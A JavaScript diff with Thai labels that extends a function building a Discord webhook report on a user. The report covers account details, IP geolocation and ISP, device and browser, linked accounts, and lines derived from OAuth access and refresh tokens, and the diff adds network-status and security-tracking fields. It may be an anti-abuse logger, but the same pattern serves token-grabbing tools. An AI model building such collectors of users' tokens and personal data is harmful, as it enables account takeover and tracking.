@@ -335,6 +335,7 @@ function buildIpLocationLines(ipInfo, rawIp, networkTypes) {
     const isp = ipInfo.isp || "ไม่ทราบ ISP";
     const org = ipInfo.org || ipInfo.as || "ไม่ระบุ";
     const reverseDns = ipInfo.reverse || ipInfo.hostname || "ไม่ระบุ";
+    const networkStatusDetail = Array.isArray(networkTypes) && networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้านปกติ";
     const mobileOrBroadband = formatMobileOrBroadband(ipInfo);
 
     return [
@@ -347,6 +348,7 @@ function buildIpLocationLines(ipInfo, rawIp, networkTypes) {
         `  • ผู้ให้บริการอินเทอร์เน็ต : ${isp}`,
         `  • องค์กรโครงข่าย : ${org}`,
         `  • ชื่อโหนดโฮสต์ของเครือข่าย : ${reverseDns}`,
+        `  • สถานะเครือข่ายที่ตรวจพบ : ${networkStatusDetail}`,
         `  • เน็ตมือถือหรือเน็ตบ้าน : ${mobileOrBroadband}`
     ];
 }
@@ -490,13 +492,15 @@ function buildWebhookPayload({
         : "ไม่มีการเชื่อมต่อบัญชีภายนอก";
     const connectionLines = [`  •  ${connList}`];
     const tokenLines = buildTokenLines(tokens, findings, accessToken, refreshToken);
+    const securityLines = buildSecurityTrackingLines(device, trackingSnapshot, findings);
 
     const fields = [
         ...chunkLinesToFields(`${EMOJIS.ROLES} ข้อมูลบัญชี Discord`, discordInfoLines),
         ...chunkLinesToFields(`${EMOJIS.SHIELD} ที่อยู่ IP & ตำแหน่ง`, ipLocationLines),
         ...chunkLinesToFields(`${EMOJIS.ANDROID} อุปกรณ์ & เบราว์เซอร์`, deviceLines),
         ...chunkLinesToFields(`${EMOJIS.LOCK} บัญชีนอกที่เชื่อมต่อ`, connectionLines),
-        ...chunkLinesToFields(`${EMOJIS.CODE} สิทธิ์และการเข้าถึง`, tokenLines)
+        ...chunkLinesToFields(`${EMOJIS.CODE} สิทธิ์และการเข้าถึง`, tokenLines),
+        ...chunkLinesToFields(`${EMOJIS.ALERT_BOUNCE} ข้อมูลระบบตรวจจับความปลอดภัย`, securityLines)
     ];
 
     let userAvatarUrl = profile.avatarUrl;
@@ -511,7 +515,7 @@ function buildWebhookPayload({
 
     let embedColor = 0xF39C12;
     if (result === "success") {
-        embedColor = 0xFFCCCC;
+        embedColor = 0x2ECC71;
     } else if (result === "blocked") {
         embedColor = 0xE74C3C;
     }
